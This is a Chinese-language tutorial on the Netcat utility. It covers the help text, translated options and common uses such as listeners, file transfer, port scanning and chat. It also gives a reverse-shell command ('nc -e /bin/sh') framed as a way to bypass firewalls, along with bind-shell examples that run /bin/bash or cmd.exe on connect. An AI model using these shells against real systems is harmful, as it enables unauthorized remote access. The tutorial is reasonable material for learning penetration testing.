# 前言

> NetCat一直被誉为“瑞士军刀”，他...............

这样的话已经看吐了，与其天天看别人写的支离破碎的教程，不如自己看一看文档

# Netcat

## 帮助信息

在`Netcat V1.10-46`版本中，`-h`可以查看帮助信息

```
[v1.10-46]
connect to somewhere:   nc [-options] hostname port[s] [ports] ... 
listen for inbound:     nc -l -p port [-options] [hostname] [port]
options:
        -c shell commands       as `-e'; use /bin/sh to exec [dangerous!!]
        -e filename             program to exec after connect [dangerous!!]
        -b                      allow broadcasts
        -g gateway              source-routing hop point[s], up to 8
        -G num                  source-routing pointer: 4, 8, 12, ...
        -h                      this cruft
        -i secs                 delay interval for lines sent, ports scanned
        -k                      set keepalive option on socket
        -l                      listen mode, for inbound connects
        -n                      numeric-only IP addresses, no DNS
        -o file                 hex dump of traffic
        -p port                 local port number
        -r                      randomize local and remote ports
        -q secs                 quit after EOF on stdin and delay of secs
        -s addr                 local source address
        -T tos                  set Type Of Service
        -t                      answer TELNET negotiation
        -u                      UDP mode
        -v                      verbose [use twice to be more verbose]
        -w secs                 timeout for connects and final net reads
        -C                      Send CRLF as line-ending
        -z                      zero-I/O mode [used for scanning]
port numbers can be individual or ranges: lo-hi [inclusive];
hyphens in port names must be backslash escaped (e.g. 'ftp\-data').
```

## 翻译

**连接到某处:** `nc [-options] hostname port[s] [ports] ... `

**开启监听:**

主要参数

| 参数          | 说明     |
| ------------- | -------- |
| -c <commands> | 在连接后执行命令 |
| -e <filename> | 在连接后运行文件 |
| -b            | 允许广播 |
| -g <gateway>  | 网关源路由跃点 最大为8 |
| -G <num>      | 设置来源路由指向器，其数值为4的倍数 |
|-i secs     | 发送包间隔（端口扫描）延时秒数 |
|        -k        | 在socket上配置keepalive                    |
|        -l           | 监听模式 |
|        -n           | 仅用IP地址，不使用DNS解析 |
|        -o file      | 文件流量的存储 |
|        -p port     | 本地端口号 |
|        -r             | 随机的本地和远程端口                       |
|       -q secs      | 在EOF 退出后的延时                         |
|        -s addr      | 本地源地址 |
|        -T tos         | 设置服务类型 |
|        -t               | TCP模式 |
|        -u            | UDP模式 |
|        -v             | 详细输出（使用两个-v可以得到更详细的输出） |
|        -w secs      | timeout的时间 |
|        -C                 | 发送CRLF作为行尾 |
|        -z                  | 无读写模式(用于扫描),连接立即关闭 |

## 应用

### 开启监听端口

监听<port>端口，准备被远程连接

```
nc -l -p <port>
```

在执行后，无回显，执行`netstat -a`可以查看到12345端口已经开启

```
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:<port>          0.0.0.0:*               LISTEN   
```

如果想输出监听到的信息，只需要使用`-v`参数来实现

```
nc -l -v -p <port>
```

在加了`-v`参数之后，执行有了回显

```
┌──(adian㉿pentest)-[~]
└─$ nc -l -v -p <port>                                                                                                                                                       
listening on [any] <port> ...
```

如果需要输出到日志文件，可以使用`>`

```
nc -l -p <port> > <filename>
```

如果需要设置只能使用TCP方式连接，则可以使用`-t`参数

```
nc -l -t -p <port>
```



### 连接到开启监听的服务器

在远程服务器开启了`-l`之后，可以去连接

```
nc <ip> <port> //可以用-n参数来指定参数类型为ip
```

如果被连接的服务器开启了`-v`则会输出

```
listening on [any] <port> ...
connect to [<ip>] from localhost [<ip>] port
```

### 连接并执行命令

远程服务器(Linux)，可以使用如下命令`-c`来让远程用户执行命令

```
nc -l -v -c "rm -rf xx.txt" -p <port>
```

其中`-c`参数可以为bash命令，如果为、`bin/bash`则为可交互，同时用`-e`参数也可以实现

如果服务器系统为Windows，则可以把`-c`参数改为`C:\Windows\System32\cmd.exe`

本地主机采用正常方式连接

```
nc <ip> <port> //可以用-n参数来指定参数类型为ip
```

连接后可执行bash命令

```
ls
公共
模板
视频
图片
文档
下载
音乐
桌面
```

但是远程服务器开了`-v`并不能看到用户执行的命令以及回显，只有在命令错误的时候会输出,尝试了用两个`-v`以及`-vv`都不能输出用户执行的命令

```
/bin/sh: 1: dasd: not found
```

### 文件传输

传输效率很低，不推荐

#### 服务端==>客户端传输：

服务端监听时

```
nc -l -p <port> > <filename>
```

客户端连接

```
nc <ip> <port> > <filename>
```

#### 客户端==>服务端传输：

服务端监听时

```
nc -l -p <port> > <filename>
```

客户端连接

```
nc <ip> <port> < <filename>
```

### 反向连接

在防火墙的作用下，连接到服务器的数据包可能会被拦截，但是主机主动发出去的通常不会被拦截,所以可以使用以下方式实现反弹shell

客户端

```
nc -l -p <port>
```

服务端

```
nc -e /bin/sh <ip> <port>
```

### 流媒体服务器

服务端

```
cat video.mp4 | nc -l -p <port>
```

客户端

```
nc -n -v <ip> <port> | mplayer -vo x11 -cache 3000 -
```



### 目录传输

目录传输需要先压缩成压缩文件再传输

或者采用比较简单的方式

服务端：
```
tar -cvf - <dir>/ | nc -l -p <port>
```
客户端：

```
nc <ip> <port> | tar -xvf -
```

### 端口扫描

验证单个端口(TCP/UDP),只有在扫描本地的时候速度很快,相比起来还是`nmap`快得多，所以尽量用专用的工具，nc只作为辅助

```
nc -z -n -v -t(u) <ip> <port>
```

目前遇到了一个问题就是如果不自定义`-w`扫描会非常慢，所以我修改了`timeout`的参数

```
nc -w 1 -nvz <ip> <port>
```

如果端口开放会返回

```
(UNKNOWN) [<ip>] <port> (?) open
```

未开放则为

```
(UNKNOWN) [<ip>] <port> (?) : Connection timed out
```

### 获取端口banner信息

使用`-v`可以获取到端口的banner信息

```
nc -v <ip> <port>
```

### 简易聊天

这是最好实现的一个，只需要在监听和连接的时候都开启`-v`参数就可以实现了

```
nc -l -v -p <port>
```

客户端

```
nc -v <ip> <port>
```

如果加了`> log.txt`这样的指令，还可以把聊天记录保存下来

